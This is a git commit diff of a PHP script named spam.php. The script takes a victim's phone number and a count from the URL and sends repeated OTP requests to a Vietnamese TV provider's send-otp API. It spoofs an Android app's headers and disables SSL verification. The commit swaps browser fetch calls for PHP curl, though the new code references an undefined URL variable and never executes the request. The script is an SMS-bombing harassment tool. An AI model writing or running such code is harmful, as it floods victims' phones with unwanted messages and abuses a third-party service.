97bf4a40ab8c22cc79b0d1c7948f8fc403d64568
agusk3 <61266725+agusk3@users.noreply.github.com>
2021-01-07 19:43:33 +0700

    Update spam.php

--- spam.php
+++ spam.php
@@ -1,37 +1,24 @@
-<?php $phone=$_GET[ "phone"]; 
+<?php 
+$phone=$_GET[ "phone"]; 
 $amount=$_GET[ "amount"];
-
+$header = array(
+    "Connection: close",
+    "Content-Type: application/x-www-form-urlencoded",
+    "User-Agent: okhttp/4.0.1"
+    );
+$data = "ver=0&manufacturer_id=3c94e2b344d907fb&device_name=Google G011A&device_model=G011A&os_sdk=22&fk=first#key&session=&os_version=5.1.1&device_type=2&version_number=10&mobile_login=".$phone;
+$url = "://apib2cm.mytvnet.vn/v8/vnptid/send-otp";
 if(isset($_GET[ "phone"])){ 
     if($amount=="" ){
         for($i=0; $i<=100; $i++){ 
-            echo "<script>
-const queryString = window.location.search;
-const urlParams = new URLSearchParams(queryString);
-const headers = new Headers();
-headers.append('Connection', 'close');
-headers.append('Content-Type', 'application/x-www-form-urlencoded');
-headers.append('User-Agent', 'okhttp/4.0.1');
-
-const body = `ver=0&manufacturer_id=3c94e2b344d907fb&device_name=Google G011A&device_model=G011A&os_sdk=22&fk=first#key&session=&os_version=5.1.1&device_type=2&version_number=10&mobile_login=".$phone."`;
-
-const init = {
-  method: 'POST',
-  headers,
-  body
-};
-
-fetch('https://apib2cm.mytvnet.vn/v8/vnptid/send-otp', init)
-.then((response) => {
-  return response.json(); // or .text() or .blob() ...
-})
-.then((text) => {
-  // text is the response body
-})
-.catch((e) => {
-  // error in e.message
-});
-</script>
-";
+          $ch = curl_init();
+          curl_setopt($ch, CURLOPT_URL, $login);
+          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+          curl_setopt($ch, CURLOPT_POST, 1);
+          curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
+          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+          curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
             echo "Done (".$i.")";
             echo "\r                   \r"; 
             
@@ -39,33 +26,14 @@ fetch('https://apib2cm.mytvnet.vn/v8/vnptid/send-otp', init)
         
     }else{ 
         for($i=0; $i<=(int)$amount; $i++){ 
-            echo "<script>
-const queryString = window.location.search;
-const urlParams = new URLSearchParams(queryString);
-const headers = new Headers();
-headers.append('Connection', 'close');
-headers.append('Content-Type', 'application/x-www-form-urlencoded');
-headers.append('User-Agent', 'okhttp/4.0.1');
-
-const body = `ver=0&manufacturer_id=3c94e2b344d907fb&device_name=Google G011A&device_model=G011A&os_sdk=22&fk=first#key&session=&os_version=5.1.1&device_type=2&version_number=10&mobile_login=".$phone."`;
-
-const init = {
-  method: 'POST',
-  headers,
-  body
-};
-
-fetch('https://apib2cm.mytvnet.vn/v8/vnptid/send-otp', init)
-.then((response) => {
-  return response.json(); // or .text() or .blob() ...
-})
-.then((text) => {
-  // text is the response body
-})
-.catch((e) => {
-  // error in e.message
-});
-</script>"; 
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $login);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
         echo "Done (".$i.")"; 
         echo "\r                   \r"; 
             
